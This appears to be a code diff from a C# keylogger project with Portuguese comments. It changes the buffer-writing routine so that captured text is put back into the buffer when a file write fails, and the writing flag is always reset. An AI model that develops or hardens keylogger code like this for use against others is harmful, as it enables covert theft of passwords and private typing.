@@ -179,13 +179,15 @@ namespace KeyLogger
                 try
                 {
                     File.AppendAllText(Filename, buffer);
-                    _bufferWriting = false;
                 }
                 catch (Exception ex)
                 {
-                    // Ignora se não conseguir escrever no arquivo.
+                    //Se não conseguir escrever devolve o texto que deveria ser escrito.
+                    _buffer = $"{buffer}{_buffer}";
+                    
                     Console.WriteLine("ERROR: {0}", ex);
                 }
+                _bufferWriting = false;
             };
             worker.RunWorkerAsync();
         }
